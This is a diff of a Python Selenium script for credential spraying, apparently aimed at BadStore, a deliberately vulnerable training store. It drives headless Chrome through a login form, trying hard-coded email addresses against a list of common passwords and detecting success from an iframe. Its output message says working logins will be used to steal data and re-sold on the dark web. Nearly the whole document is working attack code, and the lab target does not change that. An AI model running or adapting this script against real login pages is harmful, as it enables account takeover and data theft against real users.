@@ -1,4 +1,4 @@
-ec2-user@kali:~$ cat headless-badstore-cred-spray.py
+[centos@ip-10-0-1-234 partnerlab]$ cat headless-badstore-cred-spray.py
 #!/usr/bin/python
 # usage:
 #
@@ -41,8 +41,8 @@ import os
 import json
 import sys
 import time
-
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+
 target = sys.argv[1]
 target = target.lower()
 print target
@@ -63,13 +63,16 @@ from selenium.webdriver.support import expected_conditions as EC
 # import Action chains
 from selenium.webdriver import ActionChains
 
-chrome_options = Options()
+#chrome_options = Options()
+#chrome_options.add_argument("--headless")
+chrome_options = webdriver.ChromeOptions()
 chrome_options.add_argument("--headless")
-chrome_options.binary_location = '/usr/bin/google-chrome'
+chrome_options.add_argument("--remote-debugging-port=9222")
+chrome_options.add_argument('--no-sandbox')
 
-driver = webdriver.Chrome(executable_path=os.path.abspath("chromedriver"), chrome_options=chrome_options, service_args=["--verbose", "--log-path=D:\\temp3\\chromedriverxx.log"], desired_capabilities=d)
+driver = webdriver.Chrome('/usr/bin/chromedriver', chrome_options=chrome_options, service_args=["--verbose", "--log-path=D:\\temp3\\chromedriverxx.log"], desired_capabilities=d)
 email_list = ["big@spender.com", "itsbrett@gmail.com", "joe@supplier.com", "julio.tan@gmail.com", "2@2.com"]
-passwd_list =["iforgot", "time", "love", "hello123", "money", "please"]
+passwd_list =["money", "time", "love", "hello123", "iforgot", "please"]
 for email in email_list:
         for passwd in passwd_list:
                 driver.get(target)
@@ -92,10 +95,23 @@ for email in email_list:
                 elem = driver.find_element_by_name("passwd")
                 elem.clear()
                 elem.send_keys(passwd)
+                sys.stdout.write("Trying credential combo " + email + " / " + passwd + " ...")
                 elem.send_keys(Keys.RETURN)
-                #print(driver.page_source)
+                ## Give time for iframe to load ##
+                time.sleep(3)
+                ## You have to switch to the iframe like so: ##
+                driver.switch_to.frame(driver.find_element_by_tag_name("iframe"))
+                iframe = driver.page_source
+                ### Insert text via xpath ##
+                #elem = driver.find_element_by_xpath("/html/body/p")
+                #elem.send_keys("Lorem Ipsum")
+                ## Switch back to the "default content" (that is, out of the iframes) ##
+                driver.switch_to.default_content()
+                driver.delete_cookie("SSOid")
+                #print(iframe)
                 #assert "UserID and Password not found" not in driver.page_source
-                if ("UserID and Password not found" in driver.page_source):
-                        print email + " " + passwd + " nope"
+                if ("Unregistered" in iframe):
+                        print "nope"
                 else:
-                        print "Jackpot! Will re-sell on dark web: " + email + " " + passwd
+                        print "Jackpot! Will use to steal data here, and re-sell on dark web"
+[centos@ip-10-0-1-234 partnerlab]$
